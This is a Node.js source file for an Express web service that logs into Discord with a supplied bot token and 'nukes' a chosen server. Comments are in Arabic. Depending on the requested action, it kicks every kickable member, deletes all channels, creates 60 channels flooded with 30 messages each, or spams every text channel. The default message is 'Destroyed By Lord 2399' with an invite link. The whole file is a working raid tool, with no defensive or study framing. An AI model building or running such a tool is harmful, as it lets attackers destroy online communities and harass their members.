const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/execute', async (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;

    // رد فوري للمتصفح لمنع التعليق
    res.status(200).send({ status: '🚀 جاري محاولة تشغيل البوت..' });

    const client = new Client({ 
        intents: [
            3276799 // كود الـ All Intents لضمان الوصول لكل شيء
        ] 
    });

    try {
        await client.login(token);
        console.log(`Logged in as ${client.user.tag}`);

        const guild = await client.guilds.fetch(guildId).catch(() => null);
        if (!guild) {
            console.log("Guild not found");
            return client.destroy();
        }

        const name = customName || "Lord 2399";
        const msg = customMsg || "# Destroyed By Lord 2399\nhttps://discord.gg/2399k";

        // تنفيذ فوري وسريع جداً
        if (action === 'طرد' || action === 'تدمير') {
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick().catch(() => {}); });
        }

        if (action === 'تدمير') {
            // حذف الرومات فوراً
            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
            
            // إنشاء رومات بسرعة جنونية (60 روم في ثواني)
            for (let i = 0; i < 60; i++) {
                setTimeout(() => {
                    guild.channels.create({ 
                        name: name, 
                        type: ChannelType.GuildText 
                    }).then(ch => {
                        // سبام مكثف (30 رسالة لكل روم)
                        for(let j=0; j<30; j++) {
                            ch.send(msg).catch(() => {});
                        }
                    }).catch(() => {});
                }, i * 150); 
            }
        }

        if (action === 'سبام') {
            guild.channels.cache.forEach(ch => {
                if(ch.type === ChannelType.GuildText) {
                    for(let i=0; i<40; i++) setTimeout(() => ch.send(msg).catch(() => {}), i * 500);
                }
            });
        }

    } catch (error) {
        console.error("Login Failed:", error.message);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
